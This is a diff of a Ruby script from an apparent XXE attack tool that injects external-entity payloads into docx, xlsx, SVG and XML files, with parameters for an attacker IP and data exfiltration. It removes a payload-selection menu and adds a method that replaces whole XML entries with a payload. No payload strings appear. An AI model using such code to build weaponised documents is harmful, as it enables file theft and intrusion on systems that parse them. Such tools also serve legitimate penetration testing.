@@ -12,23 +12,6 @@ def add_payload_all(fz,payload)
 	end
 end
 
-# The menu for selecting the payload and the XML file to insert into
-def choose_file(docx)
-	fz = list_files(docx)
-	payload = select_payload
-
-	puts "|+| #{payload} selected"
-	choose do |menu|
-		menu.prompt = "Choose File to insert XXE into:"
-		menu.choice "Insert Into All Files Creating Multiple OOXML Files" do add_payload_all(fz, payload) end
-		menu.choice "Insert Into All Files In Same OOXML File" do add_payload_of(fz, payload,"") end
-		menu.choice "Create XXE 'Content Types' Canary" do entity_canary(fz, payload) end
-		fz.each do |name|
-			menu.choice name do add_payload(name, payload) end
-		end
-	end
-end
-
 # takes in a docx and returns a list of files
 def list_files(docx)
 	files = []
@@ -42,8 +25,6 @@ def list_files(docx)
 	end
 	return files
 end
-
-
 
 # Inserts payload into all files
 def add_payload_of(fz,payloadx,of)
@@ -99,6 +80,34 @@ def insert_payload_docx(ffile,name,payloadx,ip,exfil)
 	return rand_file
 end
 
+# overridden method for replacing entire xml files
+def insert_payload_docx(ffile,name,payloadx,ip,exfil,bool_replace_xml)
+	document = ""
+
+	# Read in the XLSX and grab the #{name}
+	Zip::Archive.open(ffile, Zip::CREATE) do |zipfile|
+		zipfile.fopen(name) do |f|
+			document = f.read # read entry content
+		end
+	end
+	# get file ext
+	ext = ffile.split(".").last
+	nname = "output_#{Time.now.to_i}_#{name.gsub(".","_").gsub("/","_")}"
+	rand_file = "./output/#{nname}.#{ext}"
+
+	docx_xml = payload(document,payloadx,ip,exfil)
+	docx_xml = payloadx if bool_replace_xml
+
+	FileUtils::copy_file(ffile,rand_file)
+	Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
+		zipfile.add_or_replace_buffer(name,
+								  docx_xml)
+	end
+
+	return rand_file
+end
+
+
 def insert_payload_svg(ffile,payloadx,ip,exfil)
 	# get file ext
 	nname = "output_#{Time.now.to_i}"
@@ -107,8 +116,6 @@ def insert_payload_svg(ffile,payloadx,ip,exfil)
 	contents = File.open(ffile, "rb").read
 
 	svg_p = payload(contents,payloadx,ip,exfil)
-
-	# TODO this should handle if canary is used
 
 	File.open(rand_file, 'w') { |file| file.write(svg_p) }
 
@@ -131,6 +138,7 @@ def insert_payload_xml(ffile,payloadx,ip,exfil)
 	return rand_file
 end
 
+# TODO there are many combinations of XML doctype this doesnt cover; bug if user supplies odd xml
 # this does a simple substitution of the [X]XE into the document DOCTYPE.
 #	It also resets the xml from standalone "yes" to "no"
 def payload(document,payload,ip,exfiltrate)
